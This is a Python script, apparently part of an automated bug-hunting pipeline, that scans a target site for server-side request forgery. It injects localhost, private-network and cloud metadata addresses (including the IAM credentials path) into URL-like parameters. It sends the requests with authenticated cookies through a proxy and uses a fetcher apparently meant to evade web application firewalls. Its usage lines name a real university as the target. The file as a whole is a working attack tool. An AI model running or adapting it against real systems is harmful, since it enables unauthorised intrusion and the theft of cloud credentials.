# TOOLS/pipeline/ssrf_scan.py
"""SSRF 候选参数发现：识别含 URL 类参数的端点，内网 IP 直接探测，写 hunt_queue。

用法:
  uv run python TOOLS/pipeline/ssrf_scan.py --target "台州学院"
  uv run python TOOLS/pipeline/ssrf_scan.py --target "台州学院" --delay 1.5 --max-rotations 3

输出:
  [SSRF_SCAN] candidates={n} probed={m} found={k}
"""

from __future__ import annotations

import argparse
import json
import re
import sqlite3
import sys
import time
from pathlib import Path
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests
import urllib3

urllib3.disable_warnings()

_TOOLS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_TOOLS))

from db.cookie_helper import get_auth_cookie_header  # noqa: E402
from db.db_utils import connect, find_db  # noqa: E402
from utils.waf_rotate import RotatingFetcher  # noqa: E402

BURP_PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

SSRF_PARAMS: frozenset[str] = frozenset(
    {
        "url",
        "redirect",
        "src",
        "img",
        "callback",
        "link",
        "proxy",
        "forward",
        "fetch",
        "dest",
        "target",
        "host",
        "domain",
        "api",
        "path",
        "load",
        "server",
        "request",
        "uri",
        "next",
        "goto",
        "returnurl",
        "return_url",
        "continue",
        "to",
        "from",
        "resource",
        "endpoint",
        "site",
        "location",
        "out",
    }
)

INTERNAL_TARGETS = [
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:8080/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://10.0.0.1/",
    "http://192.168.1.1/",
]

_SSRF_BODY_INDICATORS = [
    "root:x:0:0",
    "SSH-2.0",
    "instanceId",
    "privateIp",
    "ami-",
    "iam/security-credentials",
    "computeMetadata",
    "redis_version",
    "tcp_port",
    "<!DOCTYPE html",
    "<?xml",
]

_SSRF_IP_RE = re.compile(
    r"(?:^|\s|[,\[{\"'])(?:10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|"
    r"172\.1[6-9]\.\d+\.\d+|172\.2\d\.\d+\.\d+|172\.3[01]\.\d+\.\d+|127\.\d+\.\d+\.\d+)"
)


def is_ssrf_response(status: int, body: str) -> bool:
    """Heuristic: response looks like internal/cloud content."""
    if any(ind in body for ind in _SSRF_BODY_INDICATORS):
        return True
    if _SSRF_IP_RE.search(body) and status == 200:
        return True
    return False


def find_ssrf_candidates(conn: sqlite3.Connection) -> list[dict]:
    """从 pages 表 URL 参数 + suspicious_params_json 找 SSRF 候选。"""
    candidates: list[dict] = []
    seen: set[tuple[str, str]] = set()

    rows = conn.execute("SELECT url FROM pages WHERE status='visited' AND url LIKE '%?%'").fetchall()
    for row in rows:
        raw_url = row[0] if isinstance(row, tuple) else row["url"]
        if not raw_url:
            continue
        parsed = urlparse(raw_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name in params:
            if param_name.lower() in SSRF_PARAMS:
                key = (raw_url.split("?")[0], param_name)
                if key not in seen:
                    seen.add(key)
                    candidates.append({"url": raw_url, "param": param_name, "source": "url_param"})

    rows2 = conn.execute(
        "SELECT url, suspicious_params_json FROM pages WHERE suspicious_params_json IS NOT NULL"
    ).fetchall()
    for row in rows2:
        raw_url = row[0] if isinstance(row, tuple) else row["url"]
        sp_json = row[1] if isinstance(row, tuple) else row["suspicious_params_json"]
        if not sp_json:
            continue
        try:
            sp_list = json.loads(sp_json)
            for sp in sp_list:
                pname = sp.get("name", "") if isinstance(sp, dict) else ""
                if pname.lower() in SSRF_PARAMS:
                    key = (raw_url, pname)
                    if key not in seen:
                        seen.add(key)
                        candidates.append({"url": raw_url, "param": pname, "source": "suspicious_params"})
        except (json.JSONDecodeError, AttributeError):
            pass

    return candidates


def probe_ssrf(
    url: str,
    param: str,
    payload: str,
    cookie: str | None,
    fetcher: RotatingFetcher,
    delay: float,
) -> tuple[int, str]:
    """向 url 的 param 注入 payload，返回 (status_code, body)。"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    probe_url = urlunparse(parsed._replace(query=new_query))

    headers: dict[str, str] = {"User-Agent": "Mozilla/5.0"}
    if cookie:
        headers["Cookie"] = cookie

    def _fetch() -> requests.Response:
        return requests.get(  # noqa: S113
            probe_url,
            headers=headers,
            proxies=BURP_PROXY,
            timeout=10,
            verify=False,  # noqa: S501
        )

    try:
        resp, _, _ = fetcher.fetch_with_rotation(_fetch)
        time.sleep(delay)
        if isinstance(resp, requests.Response):
            return resp.status_code, resp.text[:4096]
    except Exception as exc:  # noqa: BLE001
        print(f"  [probe_ssrf] fetch error: {exc}", file=sys.stderr)
    time.sleep(delay)
    return 0, ""


def write_ssrf_candidate(
    conn: sqlite3.Connection,
    target_id: int,
    url: str,
    param: str,
    evidence: str,
    risk_hint: str,
) -> bool:
    """写入 hunt_queue，返回 True 表示新插入。"""
    notes = f"ssrf | param={param} | {evidence[:200]}"
    try:
        cursor = conn.execute(
            """INSERT OR IGNORE INTO hunt_queue
               (target_id, method, url, query_string, endpoint_type,
                business_intent, risk_hint, status, source, notes)
               VALUES (?, 'GET', ?, '', 'ssrf_candidate', 'ssrf_probe', ?, 'queued', 'auto', ?)""",
            (target_id, url, risk_hint, notes),
        )
        conn.commit()
        return cursor.rowcount > 0
    except sqlite3.Error as e:
        print(f"  [warn] hunt_queue 写入失败 {url}: {e}", file=sys.stderr)
        return False


def main() -> None:
    parser = argparse.ArgumentParser(description="SSRF 候选参数发现")
    parser.add_argument("--target", required=True)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--max-rotations", type=int, default=3, dest="max_rotations")
    args = parser.parse_args()

    db_path = find_db(args.target)
    conn = connect(db_path)

    row = conn.execute("SELECT seed_url FROM scan_state WHERE id=1").fetchone()
    seed_url = row["seed_url"] if row else None
    if not seed_url:
        print("[error] 无 seed_url", file=sys.stderr)
        conn.close()
        sys.exit(1)

    target_row = conn.execute("SELECT id FROM targets LIMIT 1").fetchone()
    target_id: int = target_row["id"] if target_row else 1

    cookie = get_auth_cookie_header(str(db_path), seed_url, role="primary")
    candidates = find_ssrf_candidates(conn)
    print(f"[ssrf_scan] 候选: {len(candidates)} 个  delay={args.delay}s")

    fetcher = RotatingFetcher(max_rotations=args.max_rotations, rotate_delay=30.0)
    found = 0
    probed = 0

    for cand in candidates:
        for payload in INTERNAL_TARGETS:
            status, body = probe_ssrf(cand["url"], cand["param"], payload, cookie, fetcher, args.delay)
            probed += 1
            if is_ssrf_response(status, body):
                evidence = f"payload={payload} status={status} body_snippet={body[:100]}"
                inserted = write_ssrf_candidate(conn, target_id, cand["url"], cand["param"], evidence, "High")
                if inserted:
                    found += 1
                    print(f"  [!!!] SSRF? {cand['url']} param={cand['param']} payload={payload}")
                break

    conn.close()
    print(f"\n[SSRF_SCAN] candidates={len(candidates)} probed={probed} found={found}")


if __name__ == "__main__":
    main()
